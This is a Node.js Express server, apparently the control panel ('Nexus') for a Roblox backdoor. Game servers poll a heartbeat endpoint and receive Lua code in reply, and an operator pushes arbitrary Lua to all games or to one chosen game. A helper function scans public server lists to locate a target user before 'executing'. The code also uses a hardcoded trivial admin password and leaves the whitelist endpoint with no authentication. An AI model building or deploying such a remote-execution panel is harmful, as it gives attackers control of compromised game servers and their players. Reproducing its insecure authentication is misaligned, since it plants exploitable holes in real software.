const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;
app.use(express.json());
let savedLua = "-- No code pushed yet";
let activeGames = {};
let whitelist = [];
const ADMIN_PASSWORD = "Alt";
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.post('/heartbeat', (req, res) => {
    const { jobId, gameName, playerCount, userId, placeId } = req.body;
    if (userId && whitelist.length > 0 && !whitelist.includes(userId.toString())) return res.send("-- Not Whitelisted");
    if (jobId && placeId) {
        activeGames[jobId] = { name: gameName || "Unknown", players: playerCount || 0, placeId: placeId, lastSeen: Date.now(), targetLua: null };
    }
    let responseCode = (activeGames[jobId] && activeGames[jobId].targetLua) ? activeGames[jobId].targetLua : savedLua;
    if (activeGames[jobId]) activeGames[jobId].targetLua = null;
    res.send(responseCode);
});
app.post('/push-lua', (req, res) => {
    const { lua, password, targetId } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).send("Denied");
    if (targetId && activeGames[targetId]) activeGames[targetId].targetLua = lua;
    else savedLua = lua;
    res.send("Pushed");
});
app.get('/get-games', (req, res) => {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    const now = Date.now();
    for (const id in activeGames) if (now - activeGames[id].lastSeen > 30000) delete activeGames[id];
    res.json(activeGames);
});
app.post('/update-whitelist', (req, res) => {
    const { id, action } = req.body;
    if (action === 'add' && !whitelist.includes(id)) whitelist.push(id);
    if (action === 'remove') whitelist = whitelist.filter(i => i !== id);
    res.send("Updated");
});
const axios = require('axios');

async function findAndExecute(targetUserId) {
    try {
        // 1. Check if you are in the server (using RoProxy to avoid Render blocks)
        const response = await axios.get(`https://games.roproxy.com/v1/games/list-instances/Public?placeId=YOUR_PLACE_ID`);
        
        const serverList = response.data.data;
        let isFound = false;

        // 2. Scan players in active servers
        for (const server of serverList) {
            if (server.playerIds.includes(targetUserId)) {
                isFound = true;
                break;
            }
        }

        // 3. Execute if found
        if (isFound) {
            console.log("User found in server. Executing Nexus protocols...");
            // Place your execution logic here (e.g., bot message or verification)
            return { status: "success", message: "Executed successfully" };
        } else {
            return { status: "not_found", message: "User not in server" };
        }
    } catch (error) {
        console.error("Search failed:", error.message);
        return { status: "error", message: "API Timeout" };
    }
}
app.listen(PORT, '0.0.0.0', () => console.log(` Nexus Online`));
